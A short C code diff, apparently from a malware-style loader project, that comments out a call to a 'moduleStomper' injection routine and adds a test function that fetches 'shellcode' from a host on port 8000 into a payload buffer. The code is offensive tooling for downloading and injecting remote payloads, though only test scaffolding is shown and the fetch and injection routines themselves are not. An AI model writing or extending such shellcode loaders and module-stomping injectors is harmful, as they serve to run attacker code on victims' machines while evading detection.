@@ -145,10 +145,25 @@ int main() {
 // }
 
 void TestingNetAssembyLoader() {
-    LPCWSTR hostname = L"localhost";
-    LPCWSTR assembly = L"TestAssembly.bin";
+    wchar_t hostname[] = L"localhost";
+    wchar_t assembly[] = L"TestAssembly.bin";
 
-    moduleStomper(hostname, assembly);
-
+    // moduleStomper(hostname, assembly);
+    directCallTest();
     exit(0);
+}
+
+void directCallTest() {
+    wchar_t hostname[] = L"localhost";
+    wchar_t file[] = L"TestAssembly.bin";
+    wchar_t port[] = L"8000";
+    unsigned char* payload = NULL;
+    DWORD size = 0;
+
+    printf("Hostname: %ls, File: %ls, Port: %ls\n", hostname, file, port);
+
+    int result = fetchCode(hostname, file, port, &payload, &size);
+    if (result != 0) {
+        printf("[-] Failed to fetch shellcode with error code %d\n", result);
+    }
 }
